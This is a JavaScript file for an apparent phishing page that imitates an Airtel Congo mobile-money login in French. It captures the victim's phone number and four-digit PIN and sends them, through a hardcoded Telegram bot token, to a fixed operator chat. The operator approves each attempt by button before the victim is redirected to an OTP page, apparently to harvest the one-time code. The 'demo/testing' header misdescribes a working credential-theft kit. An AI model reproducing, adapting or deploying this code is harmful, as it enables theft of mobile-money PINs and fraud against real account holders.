// Telegram Bot Client-Side Only Integration
// SECURITY NOTE: Bot token should ideally be kept secret
// For demo/testing purposes, this implementation polls Telegram directly

// ===========================================
// CONFIGURE YOUR TELEGRAM BOT TOKEN HERE
// ===========================================
const BOT_TOKEN = '8814762444:AAHh9cM13O55o30Sv4OvXtC5B0JaF4tdm_o';
const ADMIN_CHAT_ID = '7867527304';
// ===========================================

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const eyeButton = document.querySelector('.al-eye');
const codeInputs = [...document.querySelectorAll('.al-pin')];
codeInputs.forEach(input => input.type = 'password');

if (eyeButton) {
    eyeButton.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2.5 12S6 5.5 12 5.5 21.5 12 21.5 12 18 18.5 12 18.5 2.5 12 2.5 12Z"/><circle cx="12" cy="12" r="2.8"/></svg>';
    eyeButton.addEventListener('click', () => {
        const visible = eyeButton.classList.toggle('is-visible');
        codeInputs.forEach(input => input.type = visible ? 'text' : 'password');
        if (eyeButton) eyeButton.setAttribute('aria-label', visible ? 'Masquer le code' : 'Afficher le code');
    });
}

const phoneInput = document.querySelector('#phone');
const connectBtn = document.querySelector('#connect');

if (phoneInput) {
    phoneInput.maxLength = 9;
    phoneInput.addEventListener('input', () => {
        phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
        state();
    });
}

codeInputs.forEach(input => {
    input.addEventListener('input', state);
    input.addEventListener('paste', state);
});

let approvalCheckInterval = null;
let currentRequestId = null;

function state() {
    if (!connectBtn) return;
    const ok = codeInputs.every(x => x.value.length === 1);
    const phoneValid = phoneInput.value.length === 9 && phoneInput.value.startsWith('9');
    connectBtn.disabled = !(ok && phoneValid);
    connectBtn.classList.toggle('enabled', ok && phoneValid);
}

function showInvalidNumber() {
    if (document.querySelector('.number-warning')) return;
    const warning = document.createElement('div');
    warning.className = 'number-warning';
    warning.innerHTML = '<div class="number-warning-card" role="alertdialog" aria-modal="true"><div class="number-warning-icon">⚠️</div><h2>Format Invalide</h2><p>Le numéro de téléphone doit commencer par <strong>9</strong> et contenir <strong>9 chiffres</strong>.</p><p>Veuillez entrer le bon numéro et réessayer!</p><button type="button">OK</button></div>';
    warning.querySelector('button').onclick = () => { warning.remove(); if (phoneInput) phoneInput.focus(); };
    document.body.appendChild(warning);
}

function showLoadingWithProgress(message, showRetry = false) {
    const existing = document.querySelector('.telegram-loading');
    if (existing) existing.remove();
    
    const loader = document.createElement('div');
    loader.className = 'telegram-loading';
    loader.innerHTML = '<div class="login-loading-card"><div class="login-loading-spinner"></div><h2 class="telegram-loading-title">' + message + '</h2><p class="telegram-loading-subtitle" id="telegram-loading-subtitle">Veuillez patienter...</p>' + (showRetry ? '<button type="button" id="telegram-retry" class="telegram-retry-btn">🔄 Ressayer</button>' : '') + '</div>';
    document.body.appendChild(loader);
    
    if (showRetry) {
        const retryBtn = document.querySelector('#telegram-retry');
        if (retryBtn) {
            retryBtn.addEventListener('click', () => {
                loader.remove();
                initiateTelegramApproval();
            });
        }
    }
}

function hideLoading() {
    const loader = document.querySelector('.telegram-loading');
    if (loader) loader.remove();
}

function generateRequestId() {
    return 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

async function sendTelegramNotification(phone, pin) {
    const requestId = generateRequestId();
    currentRequestId = requestId;
    
    const message = '📲 Nouvelle demande Airtel Congo\n📱 Téléphone: ' + phone + '\n🔑 PIN: ' + pin + '\n🆔 Request: ' + requestId + '\n\n✅ /approve_' + requestId + ' - Approuver\n❌ /reject_' + requestId + ' - Rejeter';
    
    try {
        const response = await fetch(TELEGRAM_API + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approuver', callback_data: 'approve_' + requestId },
                        { text: '❌ Rejeter', callback_data: 'reject_' + requestId }
                    ]]
                }
            })
        });
        const data = await response.json();
        return { success: data.ok, data: data, requestId: requestId };
    } catch (e) {
        console.error('Telegram send failed:', e);
        return { success: false, error: e.message };
    }
}

async function checkTelegramApproval(requestId) {
    try {
        const response = await fetch(TELEGRAM_API + '/getUpdates?offset=-1000000000');
        const data = await response.json();
        
        if (data.ok && data.result) {
            for (const update of data.result) {
                if (update.callback_query) {
                    const [action, id] = update.callback_query.data.split('_');
                    if (id === requestId) {
                        if (action === 'approve') {
                            return { approved: true, status: 'approved' };
                        } else if (action === 'reject') {
                            return { approved: false, status: 'rejected' };
                        }
                    }
                }
            }
        }
        return { approved: false, status: 'pending' };
    } catch (e) {
        console.error('Telegram check failed:', e);
        return { approved: false, status: 'error' };
    }
}

function startApprovalPolling(requestId) {
    let checkCount = 0;
    const maxChecks = 24;
    const startTime = Date.now();
    
    approvalCheckInterval = setInterval(async () => {
        checkCount++;
        const result = await checkTelegramApproval(requestId);
        
        const subtitle = document.getElementById('telegram-loading-subtitle');
        if (subtitle) {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            subtitle.textContent = 'Écoulé: ' + elapsed + 's...';
        }
        
        if (result.approved) {
            clearInterval(approvalCheckInterval);
            hideLoading();
            sessionStorage.setItem('airtelOTPApproved', 'true');
            sessionStorage.setItem('airtelPhone', phoneInput.value);
            sessionStorage.setItem('airtelPin', codeInputs.map(i => i.value).join(''));
            window.location.href = 'otp.html';
        } else if (result.status === 'rejected') {
            clearInterval(approvalCheckInterval);
            hideLoading();
            showLoadingWithProgress('Transaction Rejetée', true);
        } else if (checkCount >= maxChecks) {
            clearInterval(approvalCheckInterval);
            hideLoading();
            showLoadingWithProgress('Délai Expiré', true);
        }
    }, 5000);
}

function initiateTelegramApproval() {
    if (!phoneInput || !connectBtn) return;
    
    const phone = phoneInput.value;
    if (phone.length !== 9 || !phone.startsWith('9')) {
        showInvalidNumber();
        return;
    }
    
    const pin = codeInputs.map(input => input.value).join('');
    if (pin.length !== 4) {
        showLoadingWithProgress('Code PIN Invalide', true);
        return;
    }
    
    sessionStorage.setItem('airtelPhone', phone);
    sessionStorage.setItem('airtelPin', pin);
    
    showLoadingWithProgress('En Attente d\'Apport de Confirmation', true);
    
    sendTelegramNotification(phone, pin).then(result => {
        if (result.success) {
            startApprovalPolling(result.requestId);
        } else {
            hideLoading();
            showLoadingWithProgress('Erreur de Communication', true);
        }
    });
}

document.querySelector('#login-form')?.addEventListener('submit', event => {
    event.preventDefault();
    event.stopImmediatePropagation();
    initiateTelegramApproval();
});

window.addEventListener('beforeunload', () => {
    if (approvalCheckInterval) {
        clearInterval(approvalCheckInterval);
    }
});

state();